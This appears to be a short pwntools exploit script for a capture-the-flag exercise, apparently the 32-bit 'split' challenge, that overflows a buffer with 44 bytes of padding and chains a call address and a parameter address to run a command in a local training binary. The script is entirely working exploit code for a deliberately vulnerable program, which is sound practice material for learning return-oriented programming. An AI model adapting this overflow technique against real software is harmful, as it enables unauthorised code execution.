from pwn import *

p = process("./split32")
junk = 44
useful = p32(0x804861a)
param = p32(0x804a030)

payload = b"A" * junk +  useful + param

write("payload",payload)

p.sendline(payload)
print(p.recvall())